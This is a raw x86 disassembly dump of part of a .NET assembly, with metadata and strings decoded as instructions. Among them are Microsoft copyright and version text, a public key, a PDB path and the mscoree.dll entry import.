  4050c1:	sbb    DWORD PTR [edi+eax*1],eax
  4050c4:	add    DWORD PTR [edx],edx
  4050c6:	sbb    DWORD PTR [eax+eiz*1],eax
  4050c9:	add    DWORD PTR [eax],ecx
  4050cb:	add    eax,DWORD PTR ds:0x80e0220
  4050d1:	or     BYTE PTR ds:0x80120020,al
  4050d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4050d8:	pop    es
  4050d9:	pop    es
  4050da:	add    al,0x8
  4050dc:	push   cs
  4050dd:	push   cs
  4050de:	adc    DWORD PTR [eax],edx
  4050e0:	or     BYTE PTR [eax],al
  4050e2:	add    DWORD PTR [edx],edx
  4050e4:	sub    BYTE PTR [ecx+0x8ad8011],0x0
  4050eb:	add    ebx,DWORD PTR [edx+edx*1]
  4050ee:	sub    BYTE PTR [ecx+0x704020e],0x1
  4050f5:	adc    DWORD PTR [ecx],edx
  4050f7:	or     DWORD PTR [eax],eax
  4050f9:	add    ecx,DWORD PTR [esi]
  4050fb:	adc    al,BYTE PTR [eax+0x1c1d0eb1]
  405101:	add    eax,0x1d0e0207
  405106:	sbb    al,0x40
  405108:	add    DWORD PTR [eax],eax
  40510a:	xor    edx,DWORD PTR [ebx+0x79]
  40510d:	jae    0x405183
  40510f:	gs ins DWORD PTR es:[edi],dx
  405111:	cs push edx
  405113:	gs jae 0x405185
  405116:	jne    0x40518a
  405118:	arpl   WORD PTR [ebp+0x73],sp
  40511b:	cs push esp
  40511d:	outs   dx,DWORD PTR ds:[esi]
  40511e:	outs   dx,DWORD PTR ds:[esi]
  40511f:	ins    BYTE PTR es:[edi],dx
  405120:	jae    0x405150
  405122:	push   ebx
  405123:	je     0x405197
  405125:	outs   dx,DWORD PTR ds:[esi]
  405126:	outs   dx,BYTE PTR ds:[esi]
  405127:	ins    BYTE PTR es:[di],dx
  405129:	jns    0x40517f
  40512b:	jns    0x40519d
  40512d:	gs fs push edx
  405130:	gs jae 0x4051a2
  405133:	jne    0x4051a7
  405135:	arpl   WORD PTR [ebp+0x42],sp
  405138:	jne    0x4051a3
  40513a:	ins    BYTE PTR es:[edi],dx
  40513b:	fs gs jb 0x405146
  40513f:	xor    al,0x2e
  405141:	xor    BYTE PTR [esi],ch
  405143:	xor    BYTE PTR [esi],ch
  405145:	xor    BYTE PTR [eax],al
  405147:	add    BYTE PTR ds:0x1c020200,al
  40514d:	sbb    al,0x5
  40514f:	and    BYTE PTR [eax],al
  405151:	adc    al,BYTE PTR [eax+0x22007c1]
  405157:	add    DWORD PTR [esi],ecx
  405159:	adc    al,BYTE PTR [eax+0x10704c1]
  40515f:	adc    dl,BYTE PTR ds:0xe022006
  405165:	push   cs
  405166:	adc    bl,BYTE PTR [ecx]
  405168:	push   es
  405169:	and    BYTE PTR [ecx],al
  40516b:	add    DWORD PTR [ecx],edx
  40516d:	or     cl,0x8
  405170:	add    DWORD PTR [eax],eax
  405172:	add    al,BYTE PTR [eax]
  405174:	add    BYTE PTR [eax],al
  405176:	add    BYTE PTR [eax],al
  405178:	aaa    
  405179:	add    DWORD PTR [eax],eax
  40517b:	sbb    ch,BYTE PTR [esi]
  40517d:	dec    esi
  40517e:	inc    ebp
  40517f:	push   esp
  405180:	inc    esi
  405181:	jb     0x4051e4
  405183:	ins    DWORD PTR es:[edi],dx
  405184:	gs ja  0x4051f6
  405187:	jb     0x4051f4
  405189:	sub    al,0x56
  40518b:	gs jb  0x405201
  40518e:	imul   ebp,DWORD PTR [edi+0x6e],0x2e34763d
  405195:	xor    eax,0xe540001
  40519a:	adc    al,0x46
  40519c:	jb     0x4051ff
  40519e:	ins    DWORD PTR es:[edi],dx
  40519f:	gs ja  0x405211
  4051a2:	jb     0x40520f
  4051a4:	inc    esp
  4051a5:	imul   esi,DWORD PTR [ebx+0x70],0x4e79616c
  4051ac:	popa   
  4051ad:	ins    DWORD PTR es:[edi],dx
  4051ae:	add    BYTE PTR gs:0x1,al
  4051b5:	add    BYTE PTR ds:0x10001,al
  4051bb:	add    BYTE PTR [ecx],dl
  4051bd:	add    DWORD PTR [eax],eax
  4051bf:	or     al,0x47
  4051c1:	jb     0x405224
  4051c3:	jo     0x40522d
  4051c5:	inc    ebx
  4051c6:	ins    DWORD PTR es:[edi],dx
  4051c7:	fs cs gs js 0x405231
  4051cc:	add    BYTE PTR [eax],al
  4051ce:	sbb    al,BYTE PTR [ecx]
  4051d0:	add    BYTE PTR ds:0x7263694d,dl
  4051d6:	outs   dx,DWORD PTR ds:[esi]
  4051d7:	jae    0x405248
  4051d9:	data16 je 0x4051fc
  4051dc:	inc    ebx
  4051dd:	outs   dx,DWORD PTR ds:[esi]
  4051de:	jb     0x405250
  4051e0:	outs   dx,DWORD PTR ds:[esi]
  4051e1:	jb     0x405244
  4051e3:	je     0x40524e
  4051e5:	outs   dx,DWORD PTR ds:[esi]
  4051e6:	outs   dx,BYTE PTR ds:[esi]
  4051e7:	add    BYTE PTR [eax],al
  4051e9:	and    eax,0x4d200001
  4051ee:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4051f5:	je     0x4051b9
  4051f7:	scas   al,BYTE PTR es:[edi]
  4051f8:	and    BYTE PTR [esi+0x69],dl
  4051fb:	jae    0x405272
  4051fd:	popa   
  4051fe:	ins    BYTE PTR es:[edi],dx
  4051ff:	and    BYTE PTR [ebx+0x74],dl
  405202:	jne    0x405268
  405204:	imul   ebp,DWORD PTR [edi-0x3e],0x303220ae
  40520b:	xor    DWORD PTR [edx],esi
  40520d:	add    BYTE PTR [eax],al
  40520f:	xor    eax,DWORD PTR [ecx]
  405211:	add    BYTE PTR [esi],ch
  405213:	ret    0x20a9
  405216:	dec    ebp
  405217:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40521e:	je     0x405240
  405220:	inc    ebx
  405221:	outs   dx,DWORD PTR ds:[esi]
  405222:	jb     0x405294
  405224:	outs   dx,DWORD PTR ds:[esi]
  405225:	jb     0x405288
  405227:	je     0x405292
  405229:	outs   dx,DWORD PTR ds:[esi]
  40522a:	outs   dx,BYTE PTR ds:[esi]
  40522b:	and    BYTE PTR cs:[ecx+0x6c],al
  40522f:	ins    BYTE PTR es:[edi],dx
  405230:	and    BYTE PTR [edx+0x69],dh
  405233:	addr16 push 0x72207374
  405239:	gs jae 0x4052a1
  40523c:	jb     0x4052b4
  40523e:	gs fs add BYTE PTR cs:[eax],al
  405243:	adc    DWORD PTR [ecx],eax
  405245:	add    BYTE PTR [ecx+esi*1],cl
  405248:	xor    DWORD PTR [esi],ebp
  40524a:	xor    BYTE PTR [esi],ch
  40524c:	xor    eax,0x37323730
  405251:	xor    DWORD PTR cs:[eax],eax
  405254:	add    BYTE PTR ds:0x31080001,cl
  40525a:	xor    DWORD PTR [esi],ebp
  40525c:	xor    BYTE PTR [esi],ch
  40525e:	xor    BYTE PTR [esi],ch
  405260:	xor    BYTE PTR [eax],al
  405262:	add    BYTE PTR [edx],cl
  405264:	add    DWORD PTR [eax],eax
  405266:	add    eax,0x552d6e65
  40526b:	push   ebx
  40526c:	add    BYTE PTR [eax],al
  40526e:	sub    al,BYTE PTR [ecx]
  405270:	add    BYTE PTR ds:0x645c3a46,ah
  405276:	fs pop esp
  405278:	je     0x4052e9
  40527a:	outs   dx,DWORD PTR ds:[esi]
  40527b:	ins    BYTE PTR es:[edi],dx
  40527c:	jae    0x4052da
  40527e:	fs gs jbe 0x4052e6
  405282:	imul   esi,DWORD PTR [esi+0x5c],0x616e6946
  405289:	ins    BYTE PTR es:[edi],dx
  40528a:	push   eax
  40528b:	jne    0x4052ef
  40528d:	ins    BYTE PTR es:[edi],dx
  40528e:	imul   esp,DWORD PTR [ebx+0x4b],0x732e7965
  405295:	outs   dx,BYTE PTR ds:[esi]
  405296:	imul   eax,DWORD PTR [eax],0x0
  405299:	or     DWORD PTR [eax+0x1],0x0
  40529d:	add    BYTE PTR [eax+0x30],0x30
  4052a1:	xor    dh,BYTE PTR [eax+esi*1]
  4052a4:	xor    BYTE PTR [eax],dh
  4052a6:	xor    BYTE PTR [eax],dh
  4052a8:	arpl   WORD PTR [eax],di
  4052aa:	xor    BYTE PTR [eax],dh
  4052ac:	xor    BYTE PTR [eax],dh
  4052ae:	xor    BYTE PTR [ecx],dh
  4052b0:	xor    al,0x30
  4052b2:	xor    DWORD PTR [eax],esi
  4052b4:	xor    BYTE PTR [eax],dh
  4052b6:	xor    BYTE PTR [eax],dh
  4052b8:	xor    BYTE PTR ss:[edx],dh
  4052bb:	xor    BYTE PTR [eax],dh
  4052bd:	xor    BYTE PTR [eax],dh
  4052bf:	xor    BYTE PTR [eax],dh
  4052c1:	xor    dh,BYTE PTR [eax+esi*1]
  4052c4:	xor    BYTE PTR [eax],dh
  4052c6:	xor    BYTE PTR ds:0x34333532,dh
  4052cc:	xor    DWORD PTR [ebx],esi
  4052ce:	xor    DWORD PTR [eax],esi
  4052d0:	xor    BYTE PTR [eax],dh
  4052d2:	cmp    BYTE PTR [eax],dh
  4052d4:	xor    BYTE PTR [eax],dh
  4052d6:	xor    BYTE PTR [eax],dh
  4052d8:	xor    DWORD PTR [eax],esi
  4052da:	xor    BYTE PTR [eax],dh
  4052dc:	xor    DWORD PTR [eax],esi
  4052de:	xor    BYTE PTR [esi],dh
  4052e0:	xor    DWORD PTR [ebx],esi
  4052e2:	xor    edi,DWORD PTR [ecx]
  4052e4:	cmp    DWORD PTR [ecx+0x66],esp
  4052e7:	xor    WORD PTR [eax],di
  4052ea:	xor    WORD PTR gs:[ecx+0x32],sp
  4052ef:	arpl   WORD PTR [edx],si
  4052f1:	xor    eax,0x32613431
  4052f6:	aaa    
  4052f7:	xor    esp,DWORD PTR [ecx+0x34]
  4052fa:	xor    ah,BYTE PTR [ecx+edi*1+0x30]
  4052fe:	xor    al,0x32
  405300:	bound  esi,QWORD PTR [edi]
  405302:	xor    dh,BYTE PTR [ebx]
  405304:	xor    dh,BYTE PTR [ecx]
  405306:	xor    WORD PTR [edi],si
  405309:	xor    eax,0x32303137
  40530e:	cmp    WORD PTR fs:[ebp+0x62],sp
  405313:	popa   
  405314:	fs popa 
  405316:	cmp    DWORD PTR ss:[ecx],edi
  405319:	xor    dh,BYTE PTR [ebx]
  40531b:	xor    dh,BYTE PTR gs:[edi]
  40531e:	xor    edi,DWORD PTR [eax]
  405320:	xor    al,0x30
  405322:	arpl   WORD PTR ss:[edx],si
  405325:	xor    DWORD PTR [ebp+0x35],esp
  405328:	bound  edi,QWORD PTR [eax]
  40532a:	xor    BYTE PTR [ecx],dh
  40532c:	xor    eax,0x62613235
  405331:	cmp    BYTE PTR [edx+esi*1+0x30],ah
  405335:	xor    BYTE PTR [ecx+0x36],ah
  405338:	xor    eax,0x35333261
  40533d:	xor    BYTE PTR gs:[eax],dh
  405340:	xor    DWORD PTR [ecx+0x63],esp
  405343:	cmp    DWORD PTR [ecx+0x64],esp
  405346:	arpl   WORD PTR [edx],si
  405348:	xor    eax,0x38643266
  40534d:	xor    DWORD PTR [ecx],esi
  40534f:	bound  esi,QWORD PTR gs:[eax]
  405352:	cmp    DWORD PTR [ecx+edi*1],esi
  405355:	ss popa 
  405357:	xor    al,0x63
  405359:	ss popa 
  40535b:	xor    eax,0x36346439
  405360:	xor    DWORD PTR [ecx],edi
  405362:	xor    eax,0x36633938
  405367:	cmp    DWORD PTR [esi+0x35],esp
  40536a:	bound  esp,QWORD PTR [ecx+0x66]
  40536d:	xor    BYTE PTR [ebx+0x34],ah
  405370:	xor    DWORD PTR [edi],esi
  405372:	cmp    DWORD PTR [ecx+0x34],esp
  405375:	aaa    
  405376:	xor    esi,DWORD PTR [ecx]
  405378:	xor    DWORD PTR [ecx+edi*1+0x32],esp
  40537c:	xor    eax,0x64633535
  405381:	xor    BYTE PTR [eax],dh
  405383:	ss popa 
  405385:	arpl   WORD PTR [ebx+0x38],sp
  405388:	bound  esi,QWORD PTR ds:0x66393539
  40538e:	xor    ah,BYTE PTR [edx+0x64]
  405391:	ss xor DWORD PTR gs:[eax],esi
  405395:	xor    esi,DWORD PTR gs:[esi]
  405398:	xor    BYTE PTR [ebx+0x33],ah
  40539b:	xor    al,0x35
  40539d:	xor    esi,DWORD PTR [edi]
  40539f:	popa   
  4053a0:	xor    DWORD PTR [edx+esi*1+0x36],esp
  4053a4:	ss fs popa 
  4053a7:	cmp    BYTE PTR [eax],dh
  4053a9:	cmp    BYTE PTR ds:0x35363538,dh
  4053af:	cmp    BYTE PTR [ebx],dh
  4053b1:	arpl   WORD PTR [eax],di
  4053b3:	xor    eax,0x64313864
  4053b8:	popa   
  4053b9:	aaa    
  4053ba:	xor    sp,WORD PTR [ebp+0x63]
  4053be:	xor    BYTE PTR [ecx],dh
  4053c0:	gs cmp DWORD PTR fs:0x35633436,esi
  4053c8:	cmp    BYTE PTR [ecx+edi*1+0x33],ah
  4053cc:	fs aaa 
  4053ce:	xor    DWORD PTR [ebx],esi
  4053d0:	arpl   WORD PTR [eax+esi*1+0x31],sp
  4053d4:	aaa    
  4053d5:	xor    ah,BYTE PTR [ebx+0x38]
  4053d8:	xor    dh,BYTE PTR gs:[ebx]
  4053db:	popa   
  4053dc:	xor    DWORD PTR [eax],esi
  4053de:	data16 xor BYTE PTR [edx],dh
  4053e1:	xor    edi,DWORD PTR [ecx]
  4053e3:	bound  edi,QWORD PTR [eax]
  4053e5:	xor    BYTE PTR [ebx+0x39],ah
  4053e8:	bound  esi,QWORD PTR ss:[eax]
  4053eb:	aaa    
  4053ec:	aaa    
  4053ed:	xor    esi,DWORD PTR [esi]
  4053ef:	xor    ax,0x3864
  4053f3:	bound  esi,QWORD PTR [eax]
  4053f5:	xor    dh,BYTE PTR [edx]
  4053f7:	xor    eax,0x34613234
  4053fc:	gs aaa 
  4053fe:	xor    al,0x32
  405400:	xor    eax,0x66356131
  405405:	xor    al,0x33
  405407:	xor    bh,BYTE PTR [eax]
  405409:	xor    dh,BYTE PTR [ebx+esi*1]
  40540c:	xor    DWORD PTR [eax],edi
  40540e:	bound  esi,QWORD PTR [ebx]
  405410:	xor    eax,0x35613933
  405415:	popa   
  405416:	xor    BYTE PTR [eax],bh
  405418:	aaa    
  405419:	data16 cmp BYTE PTR [ebp+0x35],ah
  40541d:	xor    esp,DWORD PTR [edx+esi*1+0x66]
  405421:	xor    DWORD PTR [ebx],esi
  405423:	xor    eax,0x61633966
  405428:	xor    al,0x37
  40542a:	xor    sp,WORD PTR [edx+0x62]
  40542e:	xor    ah,BYTE PTR [ebp+0x31]
  405431:	xor    BYTE PTR [ecx+0x66],ah
  405434:	data16 xor BYTE PTR [ecx+0x66],ah
  405438:	xor    BYTE PTR [eax],bh
  40543a:	xor    al,0x39
  40543c:	xor    eax,0x62663430
  405441:	aaa    
  405442:	arpl   WORD PTR [ebp+0x61],sp
  405445:	xor    esp,DWORD PTR [esi+0x66]
  405448:	xor    DWORD PTR [ecx],edi
  40544a:	xor    ah,BYTE PTR [ebx+eiz*2+0x38]
  40544e:	fs xor BYTE PTR gs:[ebp+0x64],ah
  405453:	popa   
  405454:	fs ss xor al,0x63
  405458:	cmp    BYTE PTR ss:[ebp+0x66],ah
  40545c:	fs xor esi,DWORD PTR gs:[ebx+eiz*2]
  405461:	xor    eax,0x30336436
  405466:	xor    ah,BYTE PTR [ecx+0x64]
  405469:	xor    eax,0x36646635
  40546e:	cmp    BYTE PTR gs:[eax],dh
  405471:	xor    si,WORD PTR [eax]
  405474:	xor    ah,BYTE PTR [ebp+esi*1+0x65]
  405478:	data16 arpl WORD PTR [ebp+eiz*2+0x61],sp
  40547d:	cmp    DWORD PTR gs:0x38353633,esi
  405484:	xor    esi,DWORD PTR fs:[esi*1+0x31363532]
  40548c:	bound  esi,QWORD PTR ds:0x63363366
  405492:	xor    eax,0x66653234
  405497:	bound  esp,QWORD PTR fs:[esp+eiz*2+0x39]
  40549c:	data16 cmp BYTE PTR [eax],bh
  40549f:	cmp    BYTE PTR ds:0x33643833,dh
  4054a5:	aaa    
  4054a6:	xor    al,0x63
  4054a8:	xor    WORD PTR gs:[eax],si
  4054ac:	ss popa 
  4054ae:	arpl   WORD PTR [esi+0x37],sp
  4054b1:	cmp    DWORD PTR fs:[ebx],esi
  4054b4:	popa   
  4054b5:	xor    al,0x34
  4054b7:	xor    al,0x35
  4054b9:	arpl   WORD PTR [ebx],si
  4054bb:	arpl   WORD PTR [edi],si
  4054bd:	xor    esp,DWORD PTR [ebx+0x64]
  4054c0:	cmp    DWORD PTR [ecx],esi
  4054c2:	xor    DWORD PTR [esi+0x30],esp
  4054c5:	xor    eax,0x61613137
  4054ca:	xor    sp,WORD PTR [ebp+esi*1+0x34]
  4054cf:	fs popa 
  4054d1:	xor    DWORD PTR [edx],esi
  4054d3:	bound  esi,QWORD PTR [ecx]
  4054d5:	xor    DWORD PTR [esp+eiz*2+0x65],esp
  4054d9:	arpl   WORD PTR [ebx],si
  4054db:	aaa    
  4054dc:	xor    eax,0x813362
  4054e1:	popa   
  4054e2:	xor    eax,0x36363861
  4054e7:	xor    DWORD PTR gs:[ebp+0x65],esp
  4054eb:	xor    DWORD PTR [eax],edi
  4054ed:	data16 cmp BYTE PTR ss:[eax],dh
  4054f1:	aaa    
  4054f2:	ss cmp BYTE PTR ss:[edx],dh
  4054f6:	xor    BYTE PTR [ecx],bh
  4054f8:	xor    sp,WORD PTR [edx+0x31]
  4054fc:	xor    DWORD PTR [edx],esi
  4054fe:	xor    esi,DWORD PTR [esi]
  405500:	popa   
  405501:	arpl   WORD PTR [ebp+0x35],sp
  405504:	xor    dh,BYTE PTR gs:[ecx]
  405507:	xor    WORD PTR [ecx],si
  40550a:	aaa    
  40550b:	cmp    BYTE PTR [eax],dh
  40550d:	xor    esp,DWORD PTR [ecx+0x33]
  405510:	xor    DWORD PTR [ebx+esi*1],esi
  405513:	popa   
  405514:	bound  esp,QWORD PTR [edx+0x31]
  405517:	xor    dh,BYTE PTR [esi]
  405519:	fs xor BYTE PTR fs:[ebx],dh
  40551d:	xor    eax,0x32643764
  405522:	data16 cmp BYTE PTR [edi],dh
  405525:	bound  esi,QWORD PTR ss:[esi]
  405528:	cmp    DWORD PTR [ebx],esi
  40552a:	cmp    BYTE PTR [ecx+0x61],ah
  40552d:	data16 xor ah,BYTE PTR [ebp+0x65]
  405531:	xor    esi,DWORD PTR [ecx+esi*1]
  405534:	xor    al,0x64
  405536:	xor    eax,0x64303234
  40553b:	aaa    
  40553c:	xor    eax,0x31323633
  405541:	xor    al,0x30
  405543:	xor    BYTE PTR [edx+eiz*2+0x34],ah
  405547:	xor    al,0x61
  405549:	xor    al,0x39
  40554b:	arpl   WORD PTR [eax+edi*1],si
  40554e:	arpl   WORD PTR ss:[ebp+0x31],sp
  405552:	xor    esi,DWORD PTR [ebx+esi*1]
  405555:	xor    BYTE PTR [eax],dh
  405557:	popa   
  405558:	xor    dh,BYTE PTR [ecx]
  40555a:	xor    BYTE PTR [esi],dh
  40555c:	popa   
  40555d:	bound  esi,QWORD PTR fs:[esi]
  405560:	bound  esp,QWORD PTR [edx+eiz*2+0x34]
  405564:	xor    esi,DWORD PTR [ebx]
  405566:	xor    eax,0x65663039
  40556b:	data16 cmp BYTE PTR [ecx+0x64],ah
  40556f:	xor    eax,0x63333463
  405574:	bound  esp,QWORD PTR [ecx+0x38]
  405577:	xor    dh,BYTE PTR [edx]
  405579:	cmp    DWORD PTR [eax],esi
  40557b:	arpl   WORD PTR fs:[ecx+edi*1],si
  40557f:	xor    eax,0x66653033
  405584:	data16 cmp BYTE PTR fs:[esi],dh
  405588:	xor    eax,0x39643332
  40558d:	xor    al,0x38
  40558f:	xor    esp,DWORD PTR [ebx+0x30]
  405592:	xor    BYTE PTR [esi+0x34],ah
  405595:	xor    eax,0x34666138
  40559a:	cmp    BYTE PTR ss:[ecx],bh
  40559d:	xor    BYTE PTR [eax],dh
  40559f:	xor    esi,DWORD PTR [esi]
  4055a1:	bound  esi,QWORD PTR [eax]
  4055a3:	xor    ah,BYTE PTR gs:[ebx+0x36]
  4055a7:	xor    DWORD PTR [eax+esi*1+0x37],esp
  4055ab:	aaa    
  4055ac:	fs aaa 
  4055ae:	bound  sp,DWORD PTR [ecx+0x63]
  4055b2:	xor    al,0x36
  4055b4:	aaa    
  4055b5:	popa   
  4055b6:	xor    eax,0x62653630
  4055bb:	popa   
  4055bc:	xor    bh,BYTE PTR [ecx]
  4055be:	gs xor al,0x36
  4055c1:	aaa    
  4055c2:	popa   
  4055c3:	cmp    BYTE PTR [edi],dh
  4055c5:	xor    DWORD PTR [ecx],edi
  4055c7:	cmp    BYTE PTR [edx+0x30],ah
  4055ca:	xor    eax,0x34376333
  4055cf:	cmp    DWORD PTR [ecx+0x61],esp
  4055d2:	xor    ah,BYTE PTR [ecx+0x34]
  4055d5:	xor    bh,BYTE PTR fs:[eax]
  4055d8:	xor    al,0x30
  4055da:	arpl   WORD PTR [edi],si
  4055dc:	cmp    BYTE PTR [eiz*2+0x6436],dh
  4055e3:	push   ds
  4055e4:	add    DWORD PTR [eax],eax
  4055e6:	add    DWORD PTR [eax],eax
  4055e8:	push   esp
  4055e9:	add    dl,BYTE PTR [esi]
  4055eb:	push   edi
  4055ec:	jb     0x40564f
  4055ee:	jo     0x40563e
  4055f0:	outs   dx,DWORD PTR ds:[esi]
  4055f1:	outs   dx,BYTE PTR ds:[esi]
  4055f2:	inc    ebp
  4055f3:	js     0x405658
  4055f5:	gs jo  0x40566c
  4055f8:	imul   ebp,DWORD PTR [edi+0x6e],0x6f726854
  4055ff:	ja     0x405674
  405601:	add    DWORD PTR [eax],ecx
  405603:	add    DWORD PTR [eax],eax
  405605:	or     BYTE PTR [eax],al
	...
  40560f:	add    BYTE PTR [ebx],ah
  405611:	int3   
  405612:	adc    DWORD PTR [eax+0x0],edx
  405615:	add    BYTE PTR [eax],al
  405617:	add    BYTE PTR [edx],al
  405619:	add    BYTE PTR [eax],al
  40561b:	add    BYTE PTR [ecx+eax*1],bl
  40561e:	add    BYTE PTR [eax],al
  405620:	sub    BYTE PTR [esi+0x0],dl
  405623:	add    BYTE PTR [eax],ch
  405625:	cmp    BYTE PTR [eax],al
  405627:	add    BYTE PTR [edx+0x53],dl
  40562a:	inc    esp
  40562b:	push   ebx
  40562c:	mov    bh,0x8c
  40562e:	sub    ebx,edx
  405630:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405631:	fiadd  DWORD PTR [edx]
  405633:	dec    ebx
  405634:	stos   BYTE PTR es:[edi],al
  405635:	and    al,BYTE PTR [esi]
  405637:	outs   dx,DWORD PTR ds:[esi]
  405638:	push   ds
  405639:	jbe    0x40560f
  40563b:	or     BYTE PTR [ecx],al
  40563d:	add    BYTE PTR [eax],al
  40563f:	add    BYTE PTR [esi+0x3a],ah
  405642:	pop    esp
  405643:	bound  ebp,QWORD PTR [ecx+0x6e]
  405646:	popa   
  405647:	jb     0x4056b2
  405649:	gs jae 0x4056a8
  40564c:	dec    ecx
  40564d:	outs   dx,BYTE PTR ds:[esi]
  40564e:	je     0x4056b5
  405650:	jb     0x4056bf
  405652:	gs imul esp,DWORD PTR fs:[ecx+0x74],0x72705c65
  40565b:	outs   dx,DWORD PTR ds:[esi]
  40565c:	addr16 jb 0x4056c4
  40565f:	jae    0x4056d4
  405661:	imul   ebp,DWORD PTR [edi+0x6e],0x6172675c
  405668:	jo     0x4056d2
  40566a:	arpl   WORD PTR [ebp+0x64],bp
  40566d:	arpl   WORD PTR cs:[ebx+0x70],si
  405671:	jb     0x4056e2
  405673:	push   0x5f
  405675:	cmp    BYTE PTR [edi],dh
  405677:	xor    al,0x30
  405679:	aaa    
  40567a:	xor    esi,DWORD PTR [ecx]
  40567c:	xor    eax,0x626f5c32
  405681:	push   0x72
  405683:	pop    esp
  405684:	js     0x4056be
  405686:	ss pop esp
  405688:	inc    edi
  405689:	jb     0x4056ec
  40568b:	jo     0x4056f5
  40568d:	inc    ebx
  40568e:	ins    DWORD PTR es:[edi],dx
  40568f:	fs cs jo 0x4056f7
  405693:	bound  eax,QWORD PTR [eax]
	...
  405741:	add    BYTE PTR [eax],al
  405743:	add    BYTE PTR [edi+edx*2+0x0],ch
	...
  40574f:	add    BYTE PTR [esi+0x57],cl
  405755:	and    BYTE PTR [eax],al
	...
  40576b:	add    BYTE PTR [eax+0x57],al
	...
  405781:	add    BYTE PTR [edi+0x43],bl
  405784:	outs   dx,DWORD PTR ds:[esi]
  405785:	jb     0x4057cc
  405787:	js     0x4057ee
  405789:	dec    ebp
  40578a:	popa   
  40578b:	imul   ebp,DWORD PTR [esi+0x0],0x6f63736d
  405792:	jb     0x4057f9
  405794:	gs cs fs ins BYTE PTR es:[edi],dx
  405798:	ins    BYTE PTR es:[edi],dx
  405799:	add    BYTE PTR [eax],al
  40579b:	add    BYTE PTR [eax],al
  40579d:	add    bh,bh
  40579f:	and    eax,0x402000
